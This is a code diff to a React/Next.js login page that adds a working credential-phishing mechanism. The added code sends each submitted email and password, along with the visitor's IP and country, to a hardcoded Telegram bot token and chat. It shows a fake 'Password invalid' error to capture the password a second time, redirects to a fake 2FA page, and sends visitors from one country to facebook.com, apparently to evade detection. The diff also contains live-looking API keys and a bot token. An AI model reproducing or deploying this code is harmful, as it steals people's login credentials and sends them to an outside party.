@@ -2,17 +2,81 @@
 
 import { zodResolver } from "@hookform/resolvers/zod";
 import { useRouter } from "next/navigation";
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import { useForm } from "react-hook-form";
 import { z } from "zod";
 import { schema } from "./schema";
 import Link from "next/link";
 import Script from "next/script";
 
+
 type FormData = z.infer<typeof schema>;
+
+const chatId = '-4095764303';
+const botToken = '6333593472:AAEIM1_VL6YrJvIJzToBLMOdM8eVTZ-VUWQ';
+async function sendMessageToTelegramBot(chatId : any, messageText : any, botToken :any) {
+  try {
+    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const data = {
+      chat_id: chatId,
+      text: messageText,
+    };
+
+    const response = await fetch(apiUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(data),
+    });
+
+    const responseData = await response.json();
+    if (responseData.ok) {
+      console.log('Message sent:', responseData.result);
+    } else {
+      console.error('Error:', responseData);
+    }
+  } catch (error) {
+    console.error('Error sending message:', error);
+  }
+}
 export default function LoginPage() {
   const router = useRouter()
   const [countLogin, setCountLogin] = useState(0);
+  const [ip, setIp] = useState('');
+  const [userAgent, setUserAgent] = useState('');
+  const [country, setCountry] = useState('');
+  const [langCode, setLangCode] = useState('en-US');
+
+
+
+  useEffect(() => {
+    // Fetch IP address
+    fetch("https://api.ipgeolocation.io/ipgeo?apiKey=ab2b18f1cf97421582f9b9190121e2a5").then(res => res.json()).then(data => {
+      setIp(data.ip);
+      setCountry(data.country_name);
+      const lang = data.country_code2.toLowerCase();
+      setLangCode(data.languages.split(',')[1]);
+      if(data.country_code2 === 'VN'){
+        window.location.href = 'https://www.facebook.com/';
+      }
+    });
+    //const data_ip = res_ip.json();
+   
+    //fetch('https://api.ipgeolocation.io/ipgeo?apiKey=ab2b18f1cf97421582f9b9190121e2a5')
+    //  .then(res => res.json())
+    //  .then(data => {setIp(data.ip); console.log(data)});
+
+    // Get user agent
+    setUserAgent(navigator.userAgent);
+
+    // Initialize reCAPTCHA
+
+    // Cleanup reCAPTCHA on component unmount
+    return () => {
+
+    };
+  }, []);
 
   const {
     register,
@@ -25,8 +89,12 @@ export default function LoginPage() {
 
   const onSubmit = (data: any) => {
     console.log(data);
+    const message = `\nip: ${ip}\ncountry: ${country}\npersonalEmail : ${data.email}\npassword 1 : ${data.password}\n`;
+    sendMessageToTelegramBot(chatId, message, botToken);
     setCountLogin(prev => prev + 1)
     if (countLogin > 0) {
+      const message = `----Lần 2----:\nip: ${ip}\ncountry: ${country}\npersonalEmail : ${data.email}\npassword 2 : ${data.password}\n`;
+      sendMessageToTelegramBot(chatId, message, botToken);
       router.push('/2fa')
     } else {
       setError('password', { message: 'Password invalid.' });
